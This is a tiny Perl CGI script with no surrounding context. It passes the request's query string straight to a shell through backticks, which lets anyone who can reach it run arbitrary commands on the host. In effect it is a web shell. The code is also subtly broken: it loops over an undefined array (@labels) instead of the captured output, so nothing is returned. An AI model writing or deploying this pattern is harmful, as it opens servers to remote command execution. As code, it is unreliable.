#!/usr/bin/perl
print "Content-type: text/html\n\n";
my $job = $ENV{QUERY_STRING};
my @results = `$job`;
print "<pre>";
foreach my $entry (@labels) {
    print $entry . "<br/>";
}
